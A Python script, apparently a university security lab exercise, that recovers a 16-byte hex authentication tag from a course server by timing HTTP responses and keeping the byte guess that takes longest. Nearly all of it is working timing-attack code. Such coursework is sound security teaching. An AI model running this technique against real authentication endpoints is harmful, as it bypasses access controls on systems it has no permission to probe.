import sys
import time
import urllib.request
import urllib.parse

import requests

#


def listtostring(s):
    return (''.join([str(elem) for elem in s]))

#make multiple rq & return avg response time
def avg_rsp_time(url, runs):
    total = 0
    for i in range(runs):
        #t0 = time.time()
        # make request
        response = requests.get(url)
        #t1 = time.time()
        total += response.elapsed.total_seconds() * 1000
    return total / runs


#charlist = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
#            'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

charlist = ['a', 'b', 'c', 'd', 'e', 'f', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

hexfinnishlist = []

for i in charlist:
    for j in charlist:
        hexfinnishlist.append(f"{i}{j}")

hexlist = list(set(hexfinnishlist))

#print(len(donehex))



#hexlist = ['c2', 'd0', '7d', '3c', '5e', 'd8', '74', '30', 'f6', '7f', '20', 'ce', '9e', '71', '13', '07']
#hexlist = ['02', '31', 'd4', '6f', '45', '5b', '0e', '61', 'c1', '59', '24', 'e9', 'da', '68', '6d']

#0231d46f455b0e61c15924e9da02686d

#2003c07407f07405e0d007d0200ce0c200703007107f0300
#c2c2d03030cef69e5ec27f7130207dd0
#c2d07d3c5ed87430f67f20ce9e711307                   (len = 32)

url = 'http://dart.cse.kau.se:12345/auth/100/axelalvi/'

#find first hex in tag that by checking which one gives back a response time
temp_tag = ['00'] * 16
longest_rsp = -100
curr_first = ""
for hex in hexlist:
    temp_tag[0] = hex
    tag_string = listtostring(temp_tag)
    print(tag_string)
    #response = requests.get(url + tag_string)
    rsp_time = avg_rsp_time(url + tag_string, 10)#response.elapsed.total_seconds() * 1000
    print(rsp_time)
    if(rsp_time > longest_rsp and rsp_time < 200):
        longest_rsp = rsp_time
        curr_first = hex
print(curr_first)
#curr_first will now be the first hex in tag

guessedtag = [curr_first] * 16

for i in range(1,len(guessedtag)):
    current_longest = -100
    print(f"index {i}, guessedtag: {listtostring(guessedtag)}")
    avragetime = [0] * 10

    for hex in hexlist:
        print(f"index {i} char: {hex} curr_long: {current_longest}")
        guessedtag[i] = hex
        newtag = listtostring(guessedtag)
        rq_time = avg_rsp_time((url + newtag), 1)
        print(rq_time)
        if(rq_time > current_longest):
            current_longest = rq_time
            besthex = hex

    guessedtag[i] = besthex


print(listtostring(guessedtag))
